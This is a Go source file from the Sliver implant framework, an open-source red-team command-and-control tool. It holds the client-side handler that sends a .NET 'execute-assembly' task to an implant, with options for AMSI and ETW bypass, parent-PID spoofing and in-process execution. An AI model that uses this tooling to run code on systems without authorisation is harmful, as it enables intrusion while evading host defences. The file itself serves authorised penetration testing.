package executor

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"encoding/json"
	"errors"

	"github.com/bishopfox/sliver/client/prelude/bridge"
	"github.com/bishopfox/sliver/client/prelude/config"
	"github.com/bishopfox/sliver/client/prelude/implant"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

type execasmArgs struct {
	IsDLL        bool   `json:"isDLL"`
	Process      string `json:"process"`
	Arguments    string `json:"arguments"`
	Architecture string `json:"architecture"`
	Method       string `json:"method"`
	Class        string `json:"class"`
	AppDomain    string `json:"appDomain"`
	Runtime      string `json:"runtime"`
	InProcess    bool   `json:"inProcess"`
	PPid         int32  `json:"ppid"`
	ProcessArgs  string `json:"processArgs"`
	EtwBypass    bool   `json:"etwBypass"`
	AmsiBypass   bool   `json:"amsiBypass"`
}

func executeAssemblyHandler(arguments interface{}, payload []byte, impBridge *bridge.OperatorImplantBridge, cb func(string, int, int), outputFormat string) (string, int, int) {

	argsByte, err := json.Marshal(arguments)
	if err != nil {
		return sendError(err)
	}
	asmArgs := execasmArgs{}
	err = json.Unmarshal(argsByte, &asmArgs)
	if err != nil {
		return sendError(err)
	}

	extResp, err := impBridge.RPC.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
		Request:    implant.MakeRequest(impBridge.Implant),
		IsDLL:      asmArgs.IsDLL,
		Process:    asmArgs.Process,
		Arguments:  asmArgs.Arguments,
		Assembly:   payload,
		Arch:       asmArgs.Architecture,
		Method:     asmArgs.Method,
		ClassName:  asmArgs.Class,
		AppDomain:  asmArgs.AppDomain,
		AmsiBypass: asmArgs.AmsiBypass,
		EtwBypass:  asmArgs.EtwBypass,
		Runtime:    asmArgs.Runtime,
		InProcess:  asmArgs.InProcess,
		PPid:       uint32(asmArgs.PPid),
	})

	if err != nil {
		return sendError(err)
	}
	// Async callback
	if extResp.Response != nil && extResp.Response.Async {
		impBridge.BeaconCallback(extResp.Response.TaskID, func(task *clientpb.BeaconTask) {
			err := proto.Unmarshal(task.Response, extResp)
			if err != nil {
				cb(sendError(err))
				return
			}
			cb(handleExecAsmOutput(extResp, int(impBridge.Implant.GetPID()), outputFormat))
		})
		return "", config.SuccessExitStatus, int(impBridge.Implant.GetPID())
	}
	// Sync response
	if extResp.Response != nil && extResp.Response.Err != "" {
		return sendError(errors.New(extResp.Response.Err))
	}
	return handleExecAsmOutput(extResp, int(asmArgs.PPid), outputFormat)
}

func handleExecAsmOutput(asmResp *sliverpb.ExecuteAssembly, pid int, format string) (string, int, int) {
	if format == "json" {
		return JSONFormatter(asmResp, pid)
	}
	return string(asmResp.Output), config.SuccessExitStatus, pid
}
